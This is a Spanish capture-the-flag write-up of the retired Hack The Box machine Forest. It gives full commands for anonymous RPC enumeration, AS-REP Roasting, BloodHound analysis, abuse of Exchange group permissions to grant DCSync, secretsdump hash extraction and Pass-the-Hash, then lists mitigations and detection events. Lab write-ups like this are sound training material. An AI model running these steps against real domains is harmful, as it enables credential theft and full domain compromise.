---
machine: Forest
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [ad, kerberos, asrep, bloodhound, dcsync]
---

# Forest — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

DC de `htb.local` (Server 2016) con Exchange instalado. RPC anónimo lista todos los usuarios y `svc-alfresco` no exige preautenticación, así que cae con AS-REP Roasting. Esa cuenta pertenece a `Account Operators`, que puede añadir usuarios a `Exchange Windows Permissions`, grupo con `WriteDACL` sobre el dominio. Se crea un usuario, se le dan derechos DCSync y `secretsdump` entrega el hash de `Administrator`, que se reutiliza por Pass-the-Hash.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
53/tcp    domain
88/tcp    kerberos-sec
135/tcp   msrpc
139/tcp   netbios-ssn
389/tcp   ldap
445/tcp   microsoft-ds
464/tcp   kpasswd5
636/tcp   ldaps
3268/tcp  ldap (Global Catalog)
5985/tcp  http (WinRM)
9389/tcp  adws
```

```bash
echo "<IP> htb.local FOREST.htb.local" | sudo tee -a /etc/hosts
```

## Enumeración

SMB anónimo denegado, pero RPC no:

```bash
rpcclient -U "" -N <IP> -c "enumdomusers"
```

```text
Administrator, Guest, krbtgt, sebastien, lucinda, svc-alfresco,
andy, mark, santi, EXCH01$, FOREST$
```

`ldapsearch` anónimo confirma los mismos usuarios y la presencia de Exchange (grupos `Exchange Windows Permissions` y buzones `HealthMailbox`). Ese detalle es la mitad de la escalada.

## Foothold

```bash
GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip <IP> -format john
```

Solo `svc-alfresco` devuelve hash: tiene `UF_DONT_REQUIRE_PREAUTH`.

```bash
john hash.txt --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
evil-winrm -i <IP> -u svc-alfresco -p '<password>'
```

## Escalada

```powershell
upload SharpHound.exe
./SharpHound.exe -c All --zipfilename forest.zip
download forest.zip
```

En BloodHound, el camino desde `SVC-ALFRESCO` es:

```text
SVC-ALFRESCO → Service Accounts → Privileged IT Accounts
             → Account Operators → (GenericAll)
             → Exchange Windows Permissions → (WriteDacl)
             → HTB.LOCAL → DCSync
```

`Account Operators` puede modificar la mayoría de cuentas y grupos, pero no los protegidos; `Exchange Windows Permissions` sí es modificable y tiene `WriteDACL` sobre el objeto del dominio, herencia de la instalación de Exchange.

```powershell
net user hacker 'Password123!' /add /domain
net group "Exchange Windows Permissions" hacker /add
```

```powershell
Import-Module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\hacker', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" `
  -PrincipalIdentity hacker -Rights DCSync
```

`-Credential` es necesario: la llamada LDAP debe hacerse como `hacker`, que es quien tiene el `WriteDACL`, no como la sesión actual.

```bash
secretsdump.py htb.local/hacker:'Password123!'@<IP>
```

```bash
evil-winrm -i <IP> -u Administrator -H <hash>
```

## Evidencia

- `whoami` → `htb\svc-alfresco` y después `htb\administrator`.
- Import de BloodHound con la ruta a Domain Admins.
- Hash NTLM de `Administrator` (redactado).

## Lecciones aprendidas

- El RPC anónimo sigue dando la lista de usuarios en dominios antiguos; es el primer paso antes de cualquier roasting.
- AS-REP Roasting no necesita credenciales, solo una cuenta sin preautenticación.
- Exchange crea grupos con permisos peligrosos por diseño; `Account Operators` + `Exchange Windows Permissions` es una ruta conocida.
- `WriteDACL` sobre el dominio equivale a Domain Admin: permite concederse DCSync.
- Con WinRM abierto, el hash vale más que la contraseña en claro (Pass-the-Hash).

## Mitigaciones y detección

- Sacar `svc-alfresco` (y cualquier cuenta) de `Account Operators`; es un grupo heredado y rara vez necesario.
- Revisar los permisos que Exchange deja en el dominio y eliminar `WriteDACL` para grupos que no lo necesiten.
- Exigir preautenticación Kerberos a todas las cuentas y revisar `userAccountControl`.
- Contraseñas de servicio largas; monitorizar 4768 sin preautenticación.
- Detección: eventos 4662 sobre el objeto del dominio, concesión de `DS-Replication-Get-Changes`, creación de usuarios y adición a grupos privilegiados.
- MITRE: T1558.004 (AS-REP Roasting), T1098, T1003.006 (DCSync).

## Referencias

- MITRE ATT&CK: T1558.004, T1098, T1003.006.
- Documentación de BloodHound sobre `WriteDacl`.
